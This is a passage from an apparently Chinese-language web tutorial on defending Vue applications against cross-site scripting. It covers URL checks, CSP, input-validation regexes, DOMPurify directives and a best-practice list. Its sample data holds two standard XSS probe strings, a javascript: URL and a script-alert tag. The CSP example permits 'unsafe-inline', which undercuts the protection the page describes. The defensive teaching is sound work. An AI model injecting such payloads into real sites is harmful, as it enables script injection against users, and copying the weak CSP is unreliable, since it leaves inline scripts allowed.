<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> :href</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;isValidUrl(userUrl) ? userUrl : &#39;#&#39;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;链接&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> { isValidUrl } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;@/utils/urlValidator&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  data</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      userUrl: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;javascript:alert(1)&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    };</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  },</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  methods: {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    isValidUrl</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>4. 内容安全策略 (CSP)</strong></p><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- public/index.html --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">meta</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> http-equiv</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Content-Security-Policy&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      content</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>5. 输入验证</strong></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// utils/validator.js</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> validateInput</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">input</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">type</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;text&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> validators</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    text:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">^</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">[a-zA-Z0-9\s.,!?@#$%^&amp;*()_+\-=</span><span style="--shiki-light:#22863A;--shiki-light-font-weight:bold;--shiki-dark:#85E89D;--shiki-dark-font-weight:bold;">\[\]</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">{};&#39;:&quot;</span><span style="--shiki-light:#22863A;--shiki-light-font-weight:bold;--shiki-dark:#85E89D;--shiki-dark-font-weight:bold;">\\</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">|,.&lt;&gt;</span><span style="--shiki-light:#22863A;--shiki-light-font-weight:bold;--shiki-dark:#85E89D;--shiki-dark-font-weight:bold;">\/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">?]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">*$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    email:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">^</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">^</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\s@]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;">@</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">^</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\s@]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#22863A;--shiki-light-font-weight:bold;--shiki-dark:#85E89D;--shiki-dark-font-weight:bold;">\.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">^</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\s@]</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    url:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">^</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;">https</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;">:</span><span style="--shiki-light:#22863A;--shiki-light-font-weight:bold;--shiki-dark:#85E89D;--shiki-dark-font-weight:bold;">\/\/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">.</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  };</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  </span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> validators[type] </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> validators[type].</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">test</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(input) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> false</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span></code></pre></div><p><strong>6. 使用 TypeScript</strong></p><div class="language-typescript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">typescript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">script lang</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;ts&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> { defineComponent, PropType } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;vue&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> defineComponent</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">({</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  name: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;MyComponent&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  props: {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    htmlContent: {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      type: String </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">as</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> PropType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">string</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      required: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">true</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">});</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">script</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span></span></code></pre></div><p><strong>7. 全局指令</strong></p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// directives/safe-html.js</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;dompurify&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  inserted</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">el</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">binding</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> allowedTags</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> binding.value?.allowedTags </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">||</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [];</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">setConfig</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">({</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      ALLOWED_TAGS: allowedTags,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      KEEP_CONTENT: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">true</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    });</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    el.innerHTML </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sanitize</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(binding.value?.html </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">||</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span></code></pre></div><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// main.js</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> safeHtml </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;./directives/safe-html&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">app.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">directive</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;safe-html&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, safeHtml);</span></span></code></pre></div><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> v-safe-html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;{ html: userInput, allowedTags: [&#39;p&#39;, &#39;b&#39;] }&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>Vue 3 Composition API 防护：</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> v-html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;sanitizedHtml&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> setup</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> { ref, computed } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;vue&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;dompurify&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> userInput</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> ref</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> sanitizedHtml</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> computed</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sanitize</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(userInput.value);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">});</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>最佳实践：</strong></p><ol><li><p><strong>避免使用 v-html</strong></p><ul><li>除非绝对必要</li><li>总是使用 DOMPurify 清理</li></ul></li><li><p><strong>验证所有用户输入</strong></p><ul><li>白名单验证</li><li>类型检查</li><li>长度限制</li></ul></li><li><p><strong>使用安全库</strong></p><ul><li>dompurify</li><li>sanitize-html</li><li>validator.js</li></ul></li><li><p><strong>配置 CSP</strong></p><ul><li>限制脚本来源</li><li>防止内联脚本执行</li></ul></li><li><p><strong>使用 TypeScript</strong></p><ul><li>类型安全</li><li>减少运行时错误</li></ul></li><li><p><strong>组件化安全处理</strong></p><ul><li>创建可复用的安全组件</li><li>封装验证逻辑</li></ul></li><li><p><strong>定期更新依赖</strong></p><ul><li>修复安全漏洞</li><li>使用最新版本</li></ul></li><li><p><strong>代码审查</strong></p><ul><li>检查 v-html 使用</li><li>审查动态属性绑定</li></ul></li><li><p><strong>使用 Vuex/Pinia</strong></p><ul><li>集中管理状态</li><li>统一验证逻辑</li></ul></li><li><p><strong>Vue Router 安全</strong></p><ul><li>验证路由参数</li><li>使用路由守卫</li></ul></li></ol><p><strong>示例：完整的防护方案</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> class</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;secure-component&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    &lt;!-- 安全的 HTML 渲染 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">safe-html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      :html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;content&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      :allowed-tags</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;[&#39;p&#39;, &#39;b&#39;, &#39;i&#39;, &#39;em&#39;]&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    /&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    &lt;!-- 安全的链接 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> :href</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;safeUrl(url)&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;安全链接&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    &lt;!-- 安全的输入 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">input</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      v-model</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;input&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      @input</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;validateInput&quot;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">      :class</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;{ invalid: !isValid }&quot;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    /&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
